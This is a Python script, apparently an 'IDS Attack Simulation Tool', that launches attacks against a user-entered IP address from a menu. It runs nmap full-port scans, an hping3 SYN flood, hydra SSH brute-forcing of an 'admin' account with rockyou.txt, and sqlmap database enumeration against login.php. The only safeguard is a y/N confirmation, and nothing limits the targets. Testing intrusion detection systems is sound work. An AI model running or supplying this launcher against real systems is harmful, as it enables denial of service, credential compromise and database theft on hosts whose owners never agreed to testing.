import os
import subprocess
import shutil

def check_tool(tool_name):
    """Check if a required tool is installed."""
    return shutil.which(tool_name) is not None

def run_attack(attack_type, target_ip, options={}):
    """Executes a selected attack scenario against the IDS."""
    print(f"\n[info] Executing {attack_type} attack on {target_ip}...")

    # Convert all options to strings
    options = {k: str(v) for k, v in options.items()}  

    commands = {
        "port_scan": ["nmap", "-p-", str(target_ip)],
        "dos": ["hping3", "--flood", "-c", options.get("packets", "10000"), "-d", options.get("size", "120"),
                "-S", "-w", "64", "-p", options.get("port", "80"), str(target_ip)],
        "brute_force": ["hydra", "-l", "admin", "-P", options.get("password_file", "rockyou.txt"), f"ssh://{target_ip}"],
        "sql_injection": ["sqlmap", "-u", f"http://{target_ip}/login.php", "--batch", "--dbs"]
    }

    if attack_type not in commands:
        print("[error] Unknown attack type.")
        return

    if not check_tool(commands[attack_type][0]):
        print(f"[error] Required tool '{commands[attack_type][0]}' is not installed.")
        return

    try:
        confirm = input(f"Are you sure you want to run {attack_type} on {target_ip}? (y/N): ").strip().lower()
        if confirm != "y":
            print("[warning] Attack aborted.")
            return

        result = subprocess.run(commands[attack_type], capture_output=True, text=True)
        print(result.stdout)
        print("\n[success] Attack executed successfully.")
    except Exception as e:
        print(f"[error] Error executing attack: {e}")

def main():
    print("""
    ==========================
    IDS Attack Simulation Tool
    ==========================
    [1] Port Scan
    [2] DoS Attack
    [3] Brute Force Attack
    [4] SQL Injection
    [5] Exit
    """)

    target_ip = input("Enter target IP: ").strip()

    while True:
        choice = input("Select an attack to execute: ").strip()
        if choice == "1":
            run_attack("port_scan", target_ip)
        elif choice == "2":
            packets = input("Enter number of packets (default 10,000): ").strip() or "10000"
            port = input("Enter target port (default 80): ").strip() or "80"
            run_attack("dos", target_ip, {"packets": packets, "port": port})
        elif choice == "3":
            password_file = input("Enter path to password list (default rockyou.txt): ").strip() or "rockyou.txt"
            run_attack("brute_force", target_ip, {"password_file": password_file})
        elif choice == "4":
            run_attack("sql_injection", target_ip)
        elif choice == "5":
            print("Exiting...")
            break
        else:
            print("Invalid option. Try again.")

if __name__ == "__main__":
    main()
